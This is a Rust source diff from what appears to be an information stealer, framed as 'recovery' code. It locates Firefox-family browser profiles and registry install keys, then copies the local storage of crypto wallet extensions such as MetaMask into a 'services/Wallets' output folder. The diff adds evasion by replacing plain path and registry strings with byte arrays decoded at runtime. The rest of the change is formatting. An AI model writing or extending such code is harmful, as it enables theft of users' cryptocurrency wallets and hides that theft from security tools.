@@ -1,9 +1,11 @@
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::{
     context::RecoveryContext,
     fs::copy_dir_limited,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
+use once_cell::sync::Lazy;
 use std::collections::{HashMap, HashSet};
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
@@ -13,68 +15,123 @@ use winreg::{
     enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE},
 };
 
-const GECKO_BROWSERS: &[(&str, &str)] = &[
-    ("Firefox", r"Mozilla\Firefox"),
-    ("SeaMonkey", r"Mozilla\SeaMonkey"),
-    ("Waterfox", "Waterfox"),
-    ("Pale Moon", r"Moonchild Productions\Pale Moon"),
-    ("Basilisk", "Basilisk"),
-    ("K-Meleon", "K-Meleon"),
-    ("GNU IceCat", r"GNU\IceCat"),
-    ("Conkeror", "Conkeror"),
-    ("Flock", "Flock"),
-];
+static GECKO_BROWSERS: Lazy<Vec<(&'static str, String)>> = Lazy::new(|| {
+    vec![
+        (
+            "Firefox",
+            deobf(&[
+                0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0x90, 0xAC, 0xD4, 0xCE, 0xD8, 0xCA, 0xCE, 0xDB,
+            ]),
+        ),
+        (
+            "SeaMonkey",
+            deobf(&[
+                0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0x90, 0xAC, 0x90, 0xD8, 0xDC, 0x8E, 0xCE, 0xDB,
+                0xCA, 0xD8, 0xC4,
+            ]),
+        ),
+        (
+            "Waterfox",
+            deobf(&[0x94, 0xD2, 0xD3, 0xD8, 0xCF, 0xDA, 0xD2, 0xDB]),
+        ),
+        (
+            "Pale Moon",
+            deobf(&[
+                0x8E, 0xD2, 0xD2, 0xCF, 0xDA, 0xCB, 0xD4, 0xDB, 0xD3, 0xE1, 0x93, 0xCF, 0xD2, 0xD3,
+                0xC8, 0xDA, 0xD3, 0xD4, 0xCE, 0xCF, 0x90, 0x91, 0xA5, 0xD2, 0xDB, 0xD8, 0xE1, 0x91,
+                0xD2, 0xDB, 0xD8, 0x90, 0xCE, 0xD2, 0xCE, 0xCF,
+            ]),
+        ),
+        (
+            "Basilisk",
+            deobf(&[0x91, 0xDC, 0x90, 0xD4, 0xDB, 0xD4, 0x90, 0xDA]),
+        ),
+        (
+            "K-Meleon",
+            deobf(&[0x88, 0x90, 0x8E, 0xD8, 0xDB, 0xD8, 0xCE, 0xCF]),
+        ),
+        (
+            "GNU IceCat",
+            deobf(&[
+                0x84, 0x9D, 0x96, 0x90, 0xAC, 0x8A, 0xCE, 0xD8, 0x80, 0xDC, 0xD3,
+            ]),
+        ),
+        (
+            "Conkeror",
+            deobf(&[0x80, 0xCE, 0xCF, 0xDA, 0xD8, 0xCF, 0xDA, 0xCF]),
+        ),
+        ("Flock", deobf(&[0x85, 0xDB, 0xCE, 0xDA, 0xCB])),
+    ]
+});
 
-const GECKO_INSTALL_REGISTRY: &[(&str, &[&str])] = &[
-    (
-        "Firefox",
-        &[
-            r"SOFTWARE\Mozilla\Mozilla Firefox",
-            r"SOFTWARE\WOW6432Node\Mozilla\Mozilla Firefox",
-        ],
-    ),
-    (
-        "SeaMonkey",
-        &[
-            r"SOFTWARE\Mozilla\SeaMonkey",
-            r"SOFTWARE\WOW6432Node\Mozilla\SeaMonkey",
-        ],
-    ),
-    (
-        "Waterfox",
-        &[
-            r"SOFTWARE\Waterfox Ltd\Waterfox",
-            r"SOFTWARE\WOW6432Node\Waterfox Ltd\Waterfox",
-        ],
-    ),
-    (
-        "Pale Moon",
-        &[
-            r"SOFTWARE\Moonchild Productions\Pale Moon",
-            r"SOFTWARE\WOW6432Node\Moonchild Productions\Pale Moon",
-        ],
-    ),
-    (
-        "Basilisk",
-        &[
-            r"SOFTWARE\Moonchild Productions\Basilisk",
-            r"SOFTWARE\WOW6432Node\Moonchild Productions\Basilisk",
-        ],
-    ),
-    (
-        "K-Meleon",
-        &[r"SOFTWARE\K-Meleon", r"SOFTWARE\WOW6432Node\K-Meleon"],
-    ),
-    (
-        "GNU IceCat",
-        &[r"SOFTWARE\GNU\IceCat", r"SOFTWARE\WOW6432Node\GNU\IceCat"],
-    ),
-    (
-        "Conkeror",
-        &[r"SOFTWARE\Conkeror", r"SOFTWARE\WOW6432Node\Conkeror"],
-    ),
-    ("Flock", &[r"SOFTWARE\Flock", r"SOFTWARE\WOW6432Node\Flock"]),
-];
+static GECKO_INSTALL_REGISTRY: Lazy<Vec<(&'static str, Vec<String>)>> = Lazy::new(|| {
+    vec![
+        (
+            "Firefox",
+            vec![
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x91, 0xD2, 0xDF, 0xDB,
+                    0xD2, 0xDB, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0xA5, 0xD4, 0xCF, 0xD8,
+                    0xCA, 0xCE, 0xDB,
+                ]),
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
+                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2,
+                    0xDB, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0xA5, 0xD4, 0xCF, 0xD8, 0xCA,
+                    0xCE, 0xDB,
+                ]),
+            ],
+        ),
+        (
+            "SeaMonkey",
+            vec![
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x91, 0xD2, 0xDF, 0xDB,
+                    0xD2, 0xDB, 0xE1, 0x90, 0xD8, 0xDC, 0x8E, 0xCE, 0xDB, 0xCA, 0xD8, 0xC4,
+                ]),
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
+                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2,
+                    0xDB, 0xE1, 0x90, 0xD8, 0xDC, 0x8E, 0xCE, 0xDB, 0xCA, 0xD8, 0xC4,
+                ]),
+            ],
+        ),
+        (
+            "Waterfox",
+            vec![
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xD2, 0xD3, 0xD8,
+                    0xCF, 0xDA, 0xD2, 0xDB, 0xEE, 0x8F, 0xCE, 0xD3, 0xE1, 0x94, 0xD2, 0xD3, 0xD8,
+                    0xCF, 0xDA, 0xD2, 0xDB,
+                ]),
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
+                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x94, 0xD2, 0xD3, 0xD8, 0xCF,
+                    0xDA, 0xD2, 0xDB, 0xEE, 0x8F, 0xCE, 0xD3, 0xE1, 0x94, 0xD2, 0xD3, 0xD8, 0xCF,
+                    0xDA, 0xD2, 0xDB,
+                ]),
+            ],
+        ),
+        (
+            "Pale Moon",
+            vec![
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x8E, 0xD2, 0xD2, 0xCF,
+                    0xDA, 0xCB, 0xD4, 0xDB, 0xD3, 0xE1, 0x93, 0xCF, 0xD2, 0xD3, 0xC8, 0xDA, 0xD3,
+                    0xD4, 0xCE, 0xCF, 0x90, 0x91, 0xA5, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDB,
+                    0xD8, 0x90, 0xCE, 0xD2, 0xCE, 0xCF,
+                ]),
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
+                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x8E, 0xD2, 0xD2, 0xCF, 0xDA,
+                    0xCB, 0xD4, 0xDB, 0xD3, 0xE1, 0x93, 0xCF, 0xD2, 0xD3, 0xC8, 0xDA, 0xD3, 0xD4,
+                    0xCE, 0xCF, 0x90, 0x91, 0xA5, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDB, 0xD8,
+                    0x90, 0xCE, 0xD2, 0xCE, 0xCF,
+                ]),
+            ],
+        ),
+    ]
+});
 
 const TARGET_EXTENSIONS: &[(&str, &str)] = &[
     ("MetaMask", "webextension@metamask.io"),
@@ -272,7 +329,7 @@ impl RecoveryTask for GeckoExtensionTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
         let storage_dir = self.profile.path.join("storage").join("default");
-        
+
         if !storage_dir.exists() {
             return Ok(artifacts);
         }
@@ -285,17 +342,30 @@ impl RecoveryTask for GeckoExtensionTask {
                 let extension_dir = storage_dir.join(folder_name);
 
                 if extension_dir.exists() {
-                    let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
-                        "{}_{}_{}",
-                        self.profile.browser,
-                        self.profile.profile_name,
-                        name
-                    ));
+                    let dest_root = ctx
+                        .output_dir
+                        .join("services")
+                        .join("Wallets")
+                        .join(format!(
+                            "{}_{}_{}",
+                            self.profile.browser, self.profile.profile_name, name
+                        ));
                     let _ = std::fs::create_dir_all(&dest_root);
 
-                    match copy_dir_limited(&extension_dir, &dest_root, name, &mut artifacts, usize::MAX, 0).await {
+                    match copy_dir_limited(
+                        &extension_dir,
+                        &dest_root,
+                        name,
+                        &mut artifacts,
+                        usize::MAX,
+                        0,
+                    )
+                    .await
+                    {
                         Ok(_) => debug!(extension=?name, "recovered gecko extension data"),
-                        Err(err) => warn!(extension=?name, error=?err, "failed to recover gecko extension"),
+                        Err(err) => {
+                            warn!(extension=?name, error=?err, "failed to recover gecko extension")
+                        }
                     }
                 }
             }
@@ -308,7 +378,7 @@ impl RecoveryTask for GeckoExtensionTask {
 fn resolve_extension_uuids(profile_path: &Path) -> HashMap<String, String> {
     let mut map = HashMap::new();
     let prefs_path = profile_path.join("prefs.js");
-    
+
     if let Ok(content) = std::fs::read_to_string(prefs_path) {
         for line in content.lines() {
             let line = line.trim();
@@ -317,8 +387,10 @@ fn resolve_extension_uuids(profile_path: &Path) -> HashMap<String, String> {
                     if let Some(end) = line.rfind("}\"") {
                         let json_str = &line[start + 1..end + 1];
                         let json_clean = json_str.replace("\\\"", "\"");
-                        
-                        if let Ok(parsed) = serde_json::from_str::<HashMap<String, String>>(&json_clean) {
+
+                        if let Ok(parsed) =
+                            serde_json::from_str::<HashMap<String, String>>(&json_clean)
+                        {
                             map.extend(parsed);
                         }
                     }
@@ -326,7 +398,7 @@ fn resolve_extension_uuids(profile_path: &Path) -> HashMap<String, String> {
             }
         }
     }
-    
+
     map
 }
 
@@ -336,7 +408,7 @@ pub fn discover_gecko_profiles(ctx: &RecoveryContext) -> Result<Vec<GeckoProfile
     let app_data = ctx.roaming_data_dir.clone();
     let install_map = find_install_paths();
 
-    for (browser, relative) in GECKO_BROWSERS {
+    for (browser, relative) in GECKO_BROWSERS.iter() {
         let trimmed = relative.trim_end_matches("\\").trim_end_matches('/');
         let browser_dir = app_data.join(trimmed);
         let ini_path = browser_dir.join("profiles.ini");
@@ -376,15 +448,15 @@ pub fn discover_gecko_profiles(ctx: &RecoveryContext) -> Result<Vec<GeckoProfile
 
 fn find_install_paths() -> HashMap<&'static str, PathBuf> {
     let mut paths = HashMap::new();
-    for &(browser, keys) in GECKO_INSTALL_REGISTRY {
+    for (browser, keys) in GECKO_INSTALL_REGISTRY.iter() {
         if let Some(path) = locate_install_path(keys) {
-            paths.insert(browser, path);
+            paths.insert(*browser, path);
         }
     }
     paths
 }
 
-fn locate_install_path(keys: &[&str]) -> Option<PathBuf> {
+fn locate_install_path(keys: &[String]) -> Option<PathBuf> {
     for root in [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER] {
         for key_path in keys {
             if let Ok(key) = RegKey::predef(root).open_subkey(key_path) {
